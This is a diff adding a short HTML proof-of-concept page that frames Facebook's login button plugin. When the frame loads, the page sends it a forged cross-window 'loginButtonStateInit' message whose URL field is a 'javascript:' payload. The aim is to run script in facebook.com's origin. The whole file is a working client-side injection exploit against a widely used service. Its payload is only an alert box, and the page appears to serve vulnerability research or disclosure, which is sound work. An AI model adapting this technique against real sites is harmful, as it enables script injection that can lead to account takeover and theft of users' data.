@@ -1,0 +1,10 @@
+<html>
+<script>
+function fbFrameLoaded() {
+  var iframeEl = document.getElementById('fbframe');
+  var message = {"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'123','url':'javascript:alert(document.domain);','size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971,'screenWidth':1680}}})},"origin":"ORIGIN"};
+  iframeEl.contentWindow.postMessage(message, '*');
+};
+</script>
+<iframe id="fbframe" src="https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&auto_logout_link=false&button_type=continue_with&channel=REDIRECT_URL&container_width=734&locale=en_US&sdk=joey&size=large&use_continue_as=true" onload="fbFrameLoaded(this)"></iframe>
+</html>
